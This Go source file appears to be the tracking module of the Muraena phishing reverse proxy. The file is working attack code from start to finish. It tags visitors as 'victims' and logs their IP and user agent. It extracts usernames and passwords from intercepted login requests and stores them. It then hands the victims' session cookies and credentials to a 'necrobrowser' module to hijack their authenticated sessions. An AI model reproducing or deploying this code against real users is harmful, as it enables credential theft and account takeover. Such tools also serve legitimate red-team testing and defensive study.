package tracking

import (
	//"encoding/json"
	"encoding/json"
	"fmt"
	"github.com/muraenateam/muraena/core/db"
	"net/http"
	"net/url"
	"path"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"github.com/evilsocket/islazy/tui"
	"github.com/lucasjones/reggen"

	"github.com/muraenateam/muraena/module/necrobrowser"
	"github.com/muraenateam/muraena/session"
)

const (
	// Name of this module
	Name = "tracker"

	// Description of this module
	Description = "Uniquely track clients via unique identifiers, while harvesting for web credentials and sessions"

	// Author of this module
	Author = "Muraena Team"
)

// Tracker module
type Tracker struct {
	session.SessionModule

	Enabled        bool
	Type           string
	Identifier     string
	ValidatorRegex *regexp.Regexp

	//Victims sync.Map
}

// Trace object structure
type Trace struct {
	*Tracker
	ID string
}

// Name returns the module name
func (module *Tracker) Name() string {
	return Name
}

// Description returns the module description
func (module *Tracker) Description() string {
	return Description
}

// Author returns the module author
func (module *Tracker) Author() string {
	return Author
}

// Prompt prints module status based on the provided parameters
func (module *Tracker) Prompt(what string) {
	switch strings.ToLower(what) {
	case "victims":
		module.ShowVictims()
	case "credentials":
		module.ShowCredentials()
	}
}

// IsEnabled returns a boolead to indicate if the module is enabled or not
func (module *Tracker) IsEnabled() bool {
	return module.Enabled
}

// Load configures the module by initializing its main structure and variables
func Load(s *session.Session) (m *Tracker, err error) {

	m = &Tracker{
		SessionModule: session.NewSessionModule(Name, s),
		Enabled:       s.Config.Tracking.Enabled,
		Type:          strings.ToLower(s.Config.Tracking.Type),
	}

	if !m.Enabled {
		m.Debug("is disabled")
		return
	}

	config := s.Config.Tracking
	m.Identifier = config.Identifier
	// Default Trace format is UUIDv4
	m.ValidatorRegex = regexp.MustCompile("^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[8|9|aA|bB][a-fA-F0-9]{3" +
		"}-[a-fA-F0-9]{12}$")

	if config.Regex != "" {
		m.ValidatorRegex, err = regexp.Compile(config.Regex)
		if err != nil {
			m.Warning("Failed to compile tracking validator regex: %s. Falling back to UUID4.", config.Regex)
			return
		}
	}

	m.Important("loaded successfully")
	return
}

// IsValid validates the tracking value
func (t *Trace) IsValid() bool {
	return t.ValidatorRegex.MatchString(t.ID)
}

func isDisabledMethod(method string) bool {

	method = strings.ToUpper(method)
	var disabledMethods = []string{"HEAD", "OPTIONS"}
	for _, disabled := range disabledMethods {

		disabled = strings.ToUpper(disabled)
		if method == disabled {
			return true
		}
	}

	return false
}

func isDisabledAccessMediaType(accessMedia string) bool {

	var disabledMedia = []string{"image/"}

	// Media Type handling.
	// Prevent processing of unwanted accessMedia types
	accessMedia = strings.TrimSpace(strings.ToLower(accessMedia))
	for _, skip := range disabledMedia {

		skip = strings.ToLower(skip)
		if strings.HasPrefix(accessMedia, skip) {
			return true
		}
	}

	return false
}

func isDisabledPath(requestPath string) bool {

	file := path.Base(requestPath)
	ext := strings.ToUpper(filepath.Ext(file))
	ext = strings.ReplaceAll(ext, ".", "")

	var disabledExtensions = []string{"JS", "CSS", "MAP", "WOFF", "SVG"}
	for _, disabled := range disabledExtensions {
		if ext == disabled {
			return true
		}
	}

	return false
}

func (module *Tracker) makeTrace(id string) (t *Trace) {
	t = &Trace{}
	t.Tracker = module
	t.ID = strings.TrimSpace(id)
	return
}

func (module *Tracker) makeID() string {
	str, err := reggen.NewGenerator(module.ValidatorRegex.String())
	if err != nil {
		module.Error("%", err)
		return ""
	}

	return str.Generate(1)
}

// TrackRequest tracks an HTTP Request
func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {

	t = module.makeTrace("")

	// Do Not Track if not required
	if !module.Enabled {
		return
	}

	//
	// Requests to skip
	//
	if isDisabledMethod(request.Method) {
		module.Debug("Skipping request method [%s] because untrackable ... for now ",
			tui.Bold(tui.Red(request.Method)))
		return
	}

	if isDisabledPath(request.URL.Path) {
		module.Debug("Skipping requested path [%s] because untrackable ... for now ",
			tui.Bold(tui.Red(request.URL.Path)))
		return
	}

	if isDisabledAccessMediaType(request.Header.Get("Access")) {
		module.Debug("Skipping requested Access header [%s] because untrackable ... for now ",
			tui.Bold(tui.Red(request.Header.Get("Access"))))
		return
	}

	noTraces := true

	//
	// Tracing types: Path || Query (default)
	//
	if module.Type == "path" {
		re := regexp.MustCompile(`/([^/]+)`)
		match := re.FindStringSubmatch(request.URL.Path)
		if len(match) > 0 {
			t = module.makeTrace(match[1])
			if t.IsValid() {
				request.Header.Set("If-Landing-Redirect", strings.ReplaceAll(request.URL.Path, t.ID, ""))
				noTraces = false
			}
		}
	}

	if noTraces {
		// Fallback
		// Use Query String
		t = module.makeTrace(request.URL.Query().Get(module.Identifier))
		if t.IsValid() {
			noTraces = false
		} else {
			// Checking Cookies
			c, err := request.Cookie(module.Identifier)
			if err == nil {

				t.ID = c.Value

				// Validate cookie content
				if t.IsValid() {
					module.Debug("Fetched victim from cookies: %s", tui.Bold(tui.Red(t.ID)))
					noTraces = false
				} else {
					t = module.makeTrace("")
				}
			}
		}
	}

	if noTraces {
		module.Debug("No traces found in defined channels %s", request.URL.RawPath)
		t.ID = module.makeID()
		// t = module.makeTrace("")
	}

	//
	// Set trackers:
	// - HTTP Headers If-Range
	request.Header.Set("If-Range", t.ID)

	// Check if the Trace ID is bind to an existing victim
	v, verr := module.GetVictim(t)

	if v == nil || verr != nil {
		module.Error("%+v", verr)
		return
	}

	if v.ID == "" {

		// Tracking IP
		IPSource := request.RemoteAddr
		if module.Session.Config.Tracking.IPSource != "" {
			IPSource = request.Header.Get(module.Session.Config.Tracking.IPSource)
		}

		v := &db.Victim{
			ID:           t.ID,
			IP:           IPSource,
			UA:           request.UserAgent(),
			RequestCount: 0,
			FirstSeen:    time.Now().UTC().Format("2006-01-02 15:04:05"),
			LastSeen:     time.Now().UTC().Format("2006-01-02 15:04:05"),
		}

		module.Push(v)
		module.Info("New victim [%s] IP[%s] UA[%s]", tui.Bold(tui.Red(t.ID)), IPSource, request.UserAgent())
	}

	v.RequestCount++
	return
}

// TrackResponse tracks an HTTP Response
func (module *Tracker) TrackResponse(response *http.Response) (victim *db.Victim) {

	// Do Not Track if not required
	if !module.Enabled {
		return
	}

	trackingFound := false
	t := module.makeTrace("")

	// Check cookies first to avoid replacing issues
	for _, cookie := range response.Request.Cookies() {
		if cookie.Name == module.Identifier {
			t.ID = cookie.Value
			trackingFound = t.IsValid()
			break
		}
	}

	if !trackingFound {
		// Trace not found in Cookies check If-Range HTTP Headers
		t = module.makeTrace(response.Request.Header.Get("If-Range"))
		if t.IsValid() {

			cookieDomain := module.Session.Config.Proxy.Phishing
			if module.Session.Config.Tracking.Domain != "" {
				cookieDomain = module.Session.Config.Tracking.Domain
			}
			module.Info("Setting tracking cookie for domain: %s", cookieDomain)

			response.Header.Add("Set-Cookie",
				fmt.Sprintf("%s=%s; Domain=%s; Path=/; Expires=Wed, 30 Aug 2029 00:00:00 GMT",
					module.Identifier, t.ID, cookieDomain))

			response.Header.Add("If-Range", t.ID)
			// module.Debug("Found tracking in If-Range .. pushing cookie %s (%s)", response.Request.URL, t)
			trackingFound = true
		}
	}

	if !trackingFound {
		module.Debug("Untracked response: [%s] %s", response.Request.Method, response.Request.URL)
		// Reset trace
		t = module.makeTrace("")

	} else {
		var err error
		victim, err = t.GetVictim(t)
		if err != nil {
			module.Warning("Error: cannot retrieve Victim from tracker: %s", err)
		}
	}

	return victim
}

// ExtractCredentials extracts credentials from a request body and stores within a VictimCredentials object
func (t *Trace) ExtractCredentials(body string, request *http.Request) (found bool, err error) {

	found = false
	victim, err := t.GetVictim(t)
	if err != nil {
		t.Error("%s", err)
		return found, err
	}

	// Investigate body only if the current URL.Path is related to credentials/keys to intercept
	// given UrlsOfInterest.Credentials URLs, intercept username/password using patterns defined in the JSON configuration
	for _, c := range t.Session.Config.Tracking.Urls.Credentials {
		if request.URL.Path == c {
			for _, p := range t.Session.Config.Tracking.Patterns {
				// Case *sensitive* matching
				if strings.Contains(body, p.Matching) {

					// Extract it
					value := InnerSubstring(body, p.Start, p.End)
					if value != "" {

						mediaType := strings.ToLower(request.Header.Get("Content-Type"))
						if strings.Contains(mediaType, "urlencoded") {
							value, err = url.QueryUnescape(value)
							if err != nil {
								t.Warning("%s", err)
							}
						}

						creds := &db.VictimCredential{
							Key:   p.Label,
							Value: value,
							Time:  time.Now().UTC().Format("2006-01-02 15:04:05"),
						}

						err := db.StoreVictimCreds(victim.ID, creds)
						if err != nil {
							return false, err
						}
						t.Info("[%s] New credentials! [%s:%s]", t.ID, creds.Key, creds.Value)
						found = true
					}
				}
			}
		}
	}

	if found {
		t.ShowCredentials()
	}

	return found, nil
}

// If the request URL matches those defined in authSession in the config, then
// pass the cookies in the CookieJar to necrobrowser to hijack the session
func (t *Trace) HijackSession(request *http.Request) (err error) {

	if !t.Session.Config.NecroBrowser.Enabled {
		return
	}

	getSession := false

	victim, err := t.GetVictim(t)
	if err != nil {
		return
	}

	for _, c := range t.Session.Config.Tracking.Urls.AuthSession {
		if request.URL.Path == c {
			getSession = true
			break
		}
	}

	if !getSession {
		return
	}

	// get all the cookies from the CookieJar
	cookiejar, err := db.GetVictimCookiejar(victim.ID)
	if err != nil {
		t.Error("error getting victim %s cookiejar: %s", victim.ID, err)
	}

	// get all the credentials
	var credentials []db.VictimCredential
	for i := 0; i < victim.CredsCount; i++ {
		creds, _ := db.GetVictimCreds(victim.ID, i)
		credentials = append(credentials, *creds)
	}

	// Pass credentials
	creds, err := json.MarshalIndent(credentials, "", "\t")
	if err != nil {
		t.Warning(err.Error())
	}

	m, err := t.Session.Module("necrobrowser")
	if err != nil {
		t.Error("%s", err)
	} else {
		nb, ok := m.(*necrobrowser.Necrobrowser)
		if ok {
			go nb.Instrument(cookiejar, string(creds))
		}
	}

	return
}
